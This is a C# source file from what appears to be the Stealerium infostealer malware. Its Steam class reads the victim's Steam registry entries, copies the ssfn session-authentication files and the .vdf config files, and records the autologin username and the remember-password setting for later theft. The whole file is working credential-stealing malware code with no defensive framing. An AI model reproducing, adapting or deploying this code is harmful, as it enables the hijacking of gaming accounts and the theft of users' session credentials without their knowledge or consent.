using System;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming;

internal sealed class Steam
{
	public static bool GetSteamSession(string sSavePath)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
		if (registryKey == null)
		{
			return Logging.Log("Steam >> Application path not found in registry", ret: false);
		}
		string text = registryKey.GetValue("SteamPath")!.ToString();
		if (!Directory.Exists(text))
		{
			return Logging.Log("Steam >> Application directory not found", ret: false);
		}
		Directory.CreateDirectory(sSavePath);
		try
		{
			string[] subKeyNames = registryKey.OpenSubKey("Apps")!.GetSubKeyNames();
			foreach (string text2 in subKeyNames)
			{
				using RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text2);
				if (registryKey2 != null)
				{
					string text3 = (string)registryKey2.GetValue("Name");
					text3 = (string.IsNullOrEmpty(text3) ? "Unknown" : text3);
					string text4 = (((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No");
					string text5 = (((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No");
					string text6 = (((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No");
					File.AppendAllText(sSavePath + "\\Apps.txt", "Application " + text3 + "\n\tGameID: " + text2 + "\n\tInstalled: " + text4 + "\n\tRunning: " + text5 + "\n\tUpdating: " + text6 + "\n\n");
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Steam >> Failed collect steam apps\n" + ex);
		}
		try
		{
			if (Directory.Exists(text))
			{
				Directory.CreateDirectory(sSavePath + "\\ssnf");
				string[] subKeyNames = Directory.GetFiles(text);
				foreach (string text7 in subKeyNames)
				{
					if (text7.Contains("ssfn"))
					{
						File.Copy(text7, sSavePath + "\\ssnf\\" + Path.GetFileName(text7));
					}
				}
			}
		}
		catch (Exception ex2)
		{
			Logging.Log("Steam >> Failed collect steam .ssnf files\n" + ex2);
		}
		try
		{
			string path = Path.Combine(text, "config");
			if (Directory.Exists(path))
			{
				Directory.CreateDirectory(sSavePath + "\\configs");
				string[] subKeyNames = Directory.GetFiles(path);
				foreach (string text8 in subKeyNames)
				{
					if (text8.EndsWith("vdf"))
					{
						File.Copy(text8, sSavePath + "\\configs\\" + Path.GetFileName(text8));
					}
				}
			}
		}
		catch (Exception ex3)
		{
			Logging.Log("Steam >> Failed collect steam configs\n" + ex3);
		}
		try
		{
			string text9 = (((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No");
			string contents = string.Format("Autologin User: " + registryKey.GetValue("AutoLoginUser")?.ToString() + "\nRemember password: " + text9);
			File.WriteAllText(sSavePath + "\\SteamInfo.txt", contents);
		}
		catch (Exception ex4)
		{
			Logging.Log("Steam >> Failed collect steam info\n" + ex4);
		}
		Counter.Steam = true;
		return true;
	}
}
